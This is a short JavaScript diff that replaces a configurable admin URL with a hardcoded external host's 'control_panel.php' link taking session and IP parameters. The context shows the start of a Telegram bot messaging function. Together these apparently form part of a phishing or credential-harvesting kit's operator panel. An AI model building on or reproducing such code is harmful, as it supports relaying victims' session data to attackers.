@@ -1,9 +1,7 @@
 const { getClient } = require('./db');
 
 function getAdminUrl(session, ip) {
-  const base = process.env.ADMIN_URL || '';
-  if (!base) return '';
-  return `${base}/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
+  return `https://voyage-production-a035.up.railway.app/control_panel.php?session=${encodeURIComponent(session)}&ip=${encodeURIComponent(ip)}`;
 }
 
 async function sendToTelegramBot(token, chatId, message) {
